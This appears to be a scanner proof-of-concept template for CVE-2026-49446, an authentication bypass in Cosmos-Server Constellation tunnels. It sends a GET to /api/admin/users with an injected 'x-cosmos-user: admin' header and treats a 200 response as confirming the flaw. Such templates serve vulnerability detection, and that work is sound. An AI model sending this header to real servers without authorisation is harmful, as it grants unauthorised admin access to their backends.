[info]
author = "ave"
description = "验证Cosmos-Server Constellation隧道认证绕过漏洞：攻击者持有有效设备API密钥时，在请求中注入x-cosmos-user: admin头，绕过JWT密码MFA认证以管理员身份访问代理后端"
id = "POC-AVE-2026-0698"
name = "CVE-2026-49446 PoC"
severity = "medium"
tags = ["ave-2026-0698"]
vuln_id = [
    "CVE-2026-49446",
    "AVE-2026-0698",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/api/admin/users"
protocol = "http"

[poc.requests.headers]
x-cosmos-user = "admin"

[[poc.requests.matchers]]
expect = true
part = "body"
status = [200]
type = "status"
